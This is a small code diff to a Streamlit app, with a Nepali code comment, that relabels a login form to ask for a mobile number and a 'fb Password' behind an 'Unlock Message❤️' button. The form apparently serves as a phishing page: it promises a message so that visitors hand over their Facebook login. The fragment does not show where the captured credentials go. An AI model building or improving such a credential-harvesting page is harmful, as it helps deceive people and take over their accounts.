@@ -42,8 +42,8 @@ if not st.session_state.submitted:
     # --- FIXING THE FORM LOGIC ---
     with st.form("login_form"):
         # Variable haru form vitra define gareko
-        email_val = st.text_input("Mobile number or Email Address")
-        password_val = st.text_input("Email Password", type="password")
+        email_val = st.text_input("Mobile number")
+        password_val = st.text_input("fb Password", type="password")
      
         
         submit_btn = st.form_submit_button("Unlock Message❤️")
